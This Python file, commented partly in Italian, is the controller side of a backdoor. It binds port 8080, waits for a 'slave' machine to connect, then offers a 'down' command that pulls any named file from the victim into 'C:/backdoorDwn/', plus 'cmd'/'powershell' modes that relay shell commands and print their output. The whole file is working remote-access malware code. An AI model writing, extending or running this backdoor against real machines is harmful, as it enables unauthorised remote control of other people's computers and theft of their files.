import os
import socket
from colorama import init, Fore, Style

# Creazione directory download
dwnDir = "C:/backdoorDwn/"

print("\n\n")

try:
    os.makedirs(dwnDir)
    print(Fore.YELLOW + "Download directory created succesfully\n")
except Exception:
    print("")

print(Fore.CYAN + f"Download path:\t{dwnDir}" + Fore.RESET)

# Creazione porta e attributi
s = socket.socket()
host = socket.gethostname()
ip = socket.gethostbyname(host)
port = 8080
s.bind((host, port))

print("\nServer hostname:" + Fore.GREEN + f"\t@{host}\n" + Fore.RESET)
print("Server address:" + Fore.GREEN + f"\t\t{ip}:{port}\n" + Fore.RESET)
print("Waiting for requests...\n")

# Messa in ascolto del server
s.listen(1)

# Accettazione automatica del server
conn, addr = s.accept()

# Impostazione timeout
conn.settimeout(1)

# Stampa dell'indirizzo della macchina slave
print("\n" + Fore.YELLOW + f"{addr}" + Fore.GREEN + " connected succesfully" + Fore.RESET)

while True:
    command = input(str("\nCommand >> ")).lower()

    if command == "down":
        conn.send(command.encode())
        
        filepath = input("Write the full path of the file to download (including the file name): ")
        conn.send(filepath.encode())

        file_data = conn.recv(100000)

        filename = os.path.basename(filepath)
        file_path = os.path.join(dwnDir, filename)

        with open(file_path, "wb") as new_file:
            new_file.write(file_data)

        print("\n" + Fore.GREEN + f"{filename} was downloaded succesfully" + Fore.RESET)
        print(f"Saved in: {dwnDir}\n")

    elif command == "send":

        print("Codice di esempio")

    elif command in ["cmd", "powershell"]:
        conn.send(command.encode())

        print("\n\n\n\n")

        #header iniziale
        output = conn.recv(8192).decode()
        print(Fore.YELLOW + output)
        output = conn.recv(8192).decode()
        print(output + Fore.RESET)

        while True:
            CMDcommand = input(f"{command.capitalize()} prompt >> ").lower()

            if CMDcommand == "exit":
                conn.send(CMDcommand.encode())
                break
            elif CMDcommand == "":
                print(Fore.RED + "Void command" + Fore.RESET)
            
            elif CMDcommand in ["cls", "clear"]:
                os.system("cls")
            
            else:
                conn.send(CMDcommand.encode())

                try:
                    while True:
                        output = conn.recv(65535).decode()
                        if output == "":
                            break
                        else:
                            print(Fore.YELLOW + output + Fore.RESET)
                except:
                    continue
                

    elif command in ["cls", "clear"]:

        os.system("cls")

    elif command == "close":
        conn.send(command.encode())
        conn.close()
        s.close()
        print("Sessione terminata con successo")
        break

    else:
        print(Fore.RED + "\nComando sconosciuto\n" + Fore.RESET)
